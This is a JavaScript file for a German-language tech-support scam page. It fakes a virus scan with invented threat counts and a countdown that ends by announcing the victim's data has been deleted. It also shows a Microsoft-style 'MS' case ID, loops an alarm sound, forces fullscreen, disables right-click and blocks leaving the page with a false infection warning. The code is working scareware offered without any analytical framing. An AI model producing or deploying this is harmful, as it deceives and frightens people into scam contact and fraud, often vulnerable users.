document.addEventListener('DOMContentLoaded', () => {
    // 1. Start the countdown timer
    let timeLeft = 300; // 5 minutes in seconds
    const countdownElement = document.getElementById('countdown');

    const timer = setInterval(() => {
        timeLeft--;
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        
        countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
            clearInterval(timer);
            countdownElement.textContent = "00:00";
            document.body.innerHTML = '<div class="system-failure"><h1>Systemfehler</h1><p>Ihre Daten wurden gelöscht.</div>';
        }
    }, 1000);

    // 2. Generate a fake case ID
    const caseIdElement = document.getElementById('case-id');
    const caseId = 'MS' + Math.random().toString(36).substring(2, 10).toUpperCase();
    caseIdElement.textContent = caseId;

    // 3. Virus Scanning Animation
    const progressBar = document.getElementById('scan-progress');
    const progressPercent = document.getElementById('progress-percent');
    const threatCount = document.getElementById('threat-count');
    const filesScanned = document.getElementById('files-scanned');
    
    let currentProgress = 0;
    let currentThreats = 3;
    let currentFiles = 1247;
    
    const scanInterval = setInterval(() => {
        currentProgress += Math.random() * 2 + 0.5; // Random progress between 0.5-2.5%
        if (currentProgress > 100) currentProgress = 100;
        
        progressBar.style.width = currentProgress + '%';
        progressPercent.textContent = Math.floor(currentProgress) + '%';
        
        // Update files scanned
        currentFiles += Math.floor(Math.random() * 10) + 5;
        filesScanned.textContent = currentFiles.toLocaleString();
        
        // Occasionally find new threats
        if (Math.random() < 0.1 && currentThreats < 8) {
            currentThreats++;
            threatCount.textContent = currentThreats;
        }
        
        if (currentProgress >= 100) {
            clearInterval(scanInterval);
        }
    }, 200);

    // 4. Animate scanning items
    const scanningItems = document.querySelectorAll('.scan-result.scanning');
    let currentScanIndex = 0;
    
    const scanItemInterval = setInterval(() => {
        if (currentScanIndex < scanningItems.length) {
            // Change current scanning item to "Clean" or "Threat"
            const currentItem = scanningItems[currentScanIndex];
            const isThreat = Math.random() < 0.3; // 30% chance of being a threat
            
            if (isThreat) {
                currentItem.textContent = 'BEDROHUNG ENTDECKT!';
                currentItem.className = 'scan-result threat';
                currentThreats++;
                threatCount.textContent = currentThreats;
            } else {
                currentItem.textContent = 'Sauber';
                currentItem.className = 'scan-result clean';
            }
            
            currentScanIndex++;
        } else {
            clearInterval(scanItemInterval);
        }
    }, 1500);

    // 5. Prevent the user from closing the window
    window.addEventListener('beforeunload', (event) => {
        event.preventDefault();
        event.returnValue = 'Ihr PC ist infiziert! Das Schließen dieses Fensters führt zu Datenverlust.';
        return 'Ihr PC ist infiziert! Das Schließen dieses Fensters führt zu Datenverlust.';
    });

    // 6. Prevent right-clicking
    window.addEventListener('contextmenu', (event) => {
        event.preventDefault();
    });

    // 7. Play an alert sound
    const audio = new Audio('https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg');
    audio.loop = true;
    // Autoplay is often blocked by browsers, but we can try
    audio.play().catch(e => console.error("Autoplay was blocked by the browser."));

    // A trick to play audio after user interaction on the *previous* page
    // This is more likely to work
    document.body.addEventListener('click', () => {
        audio.play().catch(e => console.error("Autoplay was blocked by the browser."));
    }, { once: true });
});

// Fullscreen the window on load - may be blocked by browser
function requestFullScreen(element) {
    if (element.requestFullscreen) {
        element.requestFullscreen();
    } else if (element.mozRequestFullScreen) {
        element.mozRequestFullScreen();
    } else if (element.webkitRequestFullscreen) {
        element.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
    } else if (element.msRequestFullscreen) {
        element.msRequestFullscreen();
    }
}

// Request fullscreen when the page loads
requestFullScreen(document.documentElement); 